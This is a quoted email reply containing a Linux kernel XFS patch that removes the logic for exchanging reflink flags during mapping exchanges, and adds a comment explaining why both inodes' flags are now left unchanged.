+> >> @@ -948,46 +924,21 @@ xfs_exchmaps_intent_destroy_cache(void)
+> >> }
+> >> 
+> >> /*
+> >> - * Decide if we will exchange the reflink flags between the two files after the
+> >> - * exchange.  The only time we want to do this is if we're exchanging all
+> >> - * mappings under EOF and the inode reflink flags have different states.
+> >> + * Allocate and initialize a new incore intent item from a request.
+> >> + *
+> >> + * Note that this does not decide anything about the two inodes' reflink flags.
+> >> + * Clearing XFS_DIFLAG2_REFLINK off an inode needs to know whether it still owns
+> >> + * shared blocks outside the exchanged range, which is not recorded in the data
+> >> + * fork and takes a refcount btree lookup.  This function has no transaction to
+> >> + * do that with and no way to report a failure, so both flags are left as they
+> >> + * are.  xfs_exchmaps_ensure_reflink() copies the flag to the peer inode when the
+> >> + * exchange runs.
+> >>  */
+> >> -static inline bool
+> >> -xmi_can_exchange_reflink_flags(
+> >> - const struct xfs_exchmaps_req *req,
+> >> - unsigned int reflink_state)
+> >> -{
+> >> - struct xfs_mount *mp = req->ip1->i_mount;
+> >> -
+> >> - /*
+> >> -  * The INO1_WRITTEN optimization can skip exchanging hole and
+> >> -  * unwritten mappings, which means we cannot guarantee that all
+> >> -  * shared extents actually moved to the other file.  Clearing the
+> >> -  * reflink flag of an inode that still holds shared extents breaks
+> >> -  * the CoW write path, so refuse to exchange the flags in that case.
+> >> -  */
+> >> - if (req->flags & XFS_EXCHMAPS_INO1_WRITTEN)
+> >> - return false;
+> >> -
+> >> - if (hweight32(reflink_state) != 1)
+> >> - return false;
+> >> - if (req->startoff1 != 0 || req->startoff2 != 0)
+> >> - return false;
+> >> - if (req->blockcount != XFS_B_TO_FSB(mp, req->ip1->i_disk_size))
+> >> - return false;
+> >> - if (req->blockcount != XFS_B_TO_FSB(mp, req->ip2->i_disk_size))
+> >> - return false;
+> >> - return true;
+> >> -}
+> >> -
+> >> -
+> >> -/* Allocate and initialize a new incore intent item from a request. */
+> >> struct xfs_exchmaps_intent *
+> >> xfs_exchmaps_init_intent(
+> >> const struct xfs_exchmaps_req *req)
+> >> {
+> >> struct xfs_exchmaps_intent *xmi;
+> >> - unsigned int rs = 0;
+> >> 
+> >> xmi = kmem_cache_zalloc(xfs_exchmaps_intent_cache,
+> >> GFP_NOFS | __GFP_NOFAIL);
+> >> @@ -1011,23 +962,6 @@ xfs_exchmaps_init_intent(
+> >> xmi->xmi_isize2 = req->ip1->i_disk_size;
+> >> }
+> >> 
+> >> - /* Record the state of each inode's reflink flag before the op. */
+> >> - if (xfs_is_reflink_inode(req->ip1))
+> >> - rs |= 1;
+> >> - if (xfs_is_reflink_inode(req->ip2))
+> >> - rs |= 2;
+> >> -
+> >> - /*
+> >> -  * Figure out if we're clearing the reflink flags (which effectively
+> >> -  * exchanges them) after the operation.
+> >> -  */
+> >> - if (xmi_can_exchange_reflink_flags(req, rs)) {
+> >> - if (rs & 1)
+> >> - xmi->xmi_flags |= XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
+> >> - if (rs & 2)
+> >> - xmi->xmi_flags |= XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
+> >> - }
+> >> -
+> >> if (S_ISDIR(VFS_I(xmi->xmi_ip2)->i_mode) ||
+> >>     S_ISLNK(VFS_I(xmi->xmi_ip2)->i_mode))
+> >> xmi->xmi_flags |= __XFS_EXCHMAPS_INO2_SHORTFORM;
+> >> -- 
+> >> 2.55.0
 > 
 > 
